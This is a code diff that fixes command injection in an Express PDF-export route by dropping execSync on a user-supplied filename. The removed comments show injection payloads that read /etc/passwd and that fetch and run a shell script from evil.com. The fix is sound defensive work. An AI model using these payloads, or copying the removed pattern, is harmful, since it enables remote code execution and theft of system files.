@@ -40,17 +40,16 @@ router.post('/query', (req, res) => {
   }
 });
 
-// VULNERABLE: Command Injection in PDF export via filename
-// GET /api/export/pdf?filename=report;cat /etc/passwd
+// FIXED: Removed command injection by avoiding shell command execution with user input
+// Instead, simulate PDF generation logic safely without execSync
 router.get('/pdf', (req, res) => {
   const { filename } = req.query;
   const reportName = filename || 'transaction-report';
 
   try {
-    // VULNERABLE: User input directly in shell command
-    // Attacker: ?filename=report;curl http://evil.com/shell.sh|bash
-    const command = `echo "Generating PDF: ${reportName}" && date`;
-    const output = execSync(command, { encoding: 'utf-8', timeout: 5000 });
+    // SECURITY FIX: Avoided command injection by not using execSync with user input
+    // Simulate PDF generation process safely
+    const output = `Generating PDF: ${reportName}\n${new Date().toString()}`;
 
     res.json({
       success: true,
